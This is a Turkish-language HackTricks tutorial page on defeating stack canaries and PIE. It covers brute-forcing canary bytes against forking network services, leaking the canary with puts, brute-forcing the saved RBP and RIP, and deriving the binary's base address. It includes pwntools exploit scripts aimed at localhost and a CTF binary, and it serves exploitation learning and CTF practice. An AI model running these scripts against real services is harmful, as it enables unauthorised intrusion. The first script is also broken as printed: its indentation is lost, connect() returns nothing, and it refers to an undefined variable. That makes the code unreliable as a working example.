<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman seviyesine kadar AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)'ı **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>


**Bir canary ve PIE (Position Independent Executable) tarafından korunan bir ikiliyle karşı karşıyaysanız, bunları atlatmanın bir yolunu bulmanız gerekebilir.**

![](<../../.gitbook/assets/image (144).png>)

{% hint style="info" %}
**`checksec`**'in, ikili bir canary tarafından korunduğunu bulamaması durumunda, bunun statik olarak derlenmiş olduğunu ve işlevi tanımlayamadığı anlamına gelebilir.\
Ancak, bir değerin bir işlev çağrısının başında yığında kaydedildiğini ve bu değerin çıkış yapmadan önce kontrol edildiğini fark ederseniz, bunu manuel olarak fark edebilirsiniz.
{% endhint %}

# Brute force Canary

Basit bir canary'yi atlatmanın en iyi yolu, ikilinin **her yeni bağlantı kurduğunuzda (ağ servisi) çocuk süreçler oluşturan bir program** olmasıdır, çünkü her bağlandığınızda **aynı canary kullanılacaktır**.

Bu durumda, canary'yi atlatmanın en iyi yolu, sadece **her karakteri brute-force** etmek ve tahmin edilen canary baytının doğru olup olmadığını anlamak için programın çöktüğünü veya düzenli akışına devam ettiğini kontrol etmektir. Bu örnekte, **8 baytlık bir canary'yi (x64)** brute-force eden ve doğru tahmin edilen bir bayt ile yanlış bir baytı sadece sunucu tarafından bir **yanıt** gönderilip gönderilmediğini kontrol ederek ayıran bir işlev bulunmaktadır (diğer durumlarda bir **try/except** kullanmak da mümkündür):

## Örnek 1

Bu örnek 64 bit için uygulanmıştır, ancak 32 bit için kolayca uygulanabilir.
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
## Örnek 2

Bu 32 bit için uygulanmıştır, ancak kolayca 64 bit için değiştirilebilir.\
Ayrıca bu örnekte **programın önce girişin boyutunu belirten bir baytı beklediğini** ve ardından yükü dikkate alın.
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
known_canary = b""
test_canary = 0x0
len_bytes_to_read = 0x21

for j in range(0, 4):
# Iterate up to 0xff times to brute force all posible values for byte
for test_canary in range(0xff):
print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")

# Send the current input size
target.send(len_bytes_to_read.to_bytes(1, "little"))

# Send this iterations canary
target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

# Scan in the output, determine if we have a correct value
output = target.recvuntil(b"exit.")
if b"YUM" in output:
# If we have a correct value, record the canary value, reset the canary value, and move on
print(" - next byte is: " + hex(test_canary))
known_canary = known_canary + test_canary.to_bytes(1, "little")
len_bytes_to_read += 1
break

# Return the canary
return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
# Canary Yazdırma

Canary'yi atlatmanın başka bir yolu onu **yazdırmaktır**.\
Stack taşmasına karşı savunmasız bir programın, **stack taşmasının bir kısmına işaret eden** bir **puts** işlevini çalıştırabileceği bir durumu hayal edin. Saldırgan, canary'nin **ilk baytının bir null bayt** (`\x00`) olduğunu ve canary'nin geri kalanının **rastgele** baytlar olduğunu bilmektedir. Ardından, saldırgan, stack'i **canary'nin ilk baytına kadar üzerine yazan bir taşmayı oluşturabilir**.\
Daha sonra, saldırgan, yükün ortasında **puts işlevini çağırır** ve bu, canary'nin **tamamını yazdırır** (ilk null bayt hariç).\
Bu bilgiyle saldırgan, canary'yi bilerek (aynı program oturumu içinde) yeni bir saldırı oluşturabilir ve gönderebilir.

Açıkçası, bu taktik çok **sınırlıdır**, çünkü saldırganın **yükünün içeriğini yazdırabilmesi**, canary'yi **dışarı çıkarabilmesi** ve ardından yeni bir yük (aynı program oturumu içinde) oluşturabilmesi ve **gerçek tampon taşmasını gönderebilmesi** gerekmektedir.\
CTF örneği: [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)

# PIE

PIE'yi atlatmak için bazı adresleri **sızdırmanız** gerekmektedir. Ve eğer ikili bir adres sızdırmıyorsa, en iyi seçenek **RBP ve RIP'yi stack'te kaydedilen yerlerde brute-force etmektir**.\
Örneğin, bir ikili hem bir **canary** hem de **PIE** kullanarak korunuyorsa, canary'yi brute-force etmeye başlayabilir, ardından **sonraki** 8 bayt (x64) kaydedilen **RBP** ve **sonraki** 8 bayt kaydedilen **RIP** olacaktır.

İkili dosyadan RBP ve RIP'yi brute-force etmek için, doğru tahmin edilen bir baytın programın bir şey çıktıladığını veya çökmediğini anlayabilirsiniz. Canary'yi brute-force etmek için sağlanan **aynı işlev**, RBP ve RIP'yi brute-force etmek için de kullanılabilir:
```python
print("Brute-Forcing RBP")
base_canary_rbp = get_bf(base_canary)
RBP = u64(base_canary_rbp[len(base_canary_rbp)-8:])
print("Brute-Forcing RIP")
base_canary_rbp_rip = get_bf(base_canary_rbp)
RIP = u64(base_canary_rbp_rip[len(base_canary_rbp_rip)-8:])
```
## Temel adresi al

PIE'yi yenmek için ihtiyacınız olan son şey, sızdırılan adreslerden yararlı adresleri hesaplamaktır: **RBP** ve **RIP**.

**RBP**'den, **shellinizi yığında nereye yazdığınızı hesaplayabilirsiniz**. Bu, _"/bin/sh\x00"_ dizesini yığının içine nereye yazacağınızı bilmek için çok faydalı olabilir. Sızdırılan RBP ve shellcode arasındaki mesafeyi hesaplamak için, sızdırdıktan sonra bir **kesme noktası koyabilir ve shellcode'un nerede bulunduğunu kontrol edebilirsiniz**, ardından shellcode ile RBP arasındaki mesafeyi hesaplayabilirsiniz:
```python
INI_SHELLCODE = RBP - 1152
```
**RIP** üzerinden, **PIE ikili dosyasının temel adresini** hesaplayabilirsiniz, bu da geçerli bir **ROP zinciri** oluşturmak için ihtiyacınız olan şeydir.\
Temel adresi hesaplamak için sadece `objdump -d vunbinary` komutunu kullanın ve aşağıdaki gibi en son adresleri inceleyin:

![](<../../.gitbook/assets/image (145).png>)

Bu örnekte, tüm kodu bulmak için sadece **1 Byte ve yarım** gerektiğini görebilirsiniz, bu durumda temel adres, sızdırılan RIP'in sonunda "000" ile biten olacaktır. Örneğin, eğer _0x562002970**ecf**_ sızdırdıysanız, temel adres _0x562002970**000**_ olacaktır.
```python
elf.address = RIP - (RIP & 0xfff)
```
<details>

<summary><strong>AWS hackleme konusunda sıfırdan kahramana kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**'ı takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.

</details>
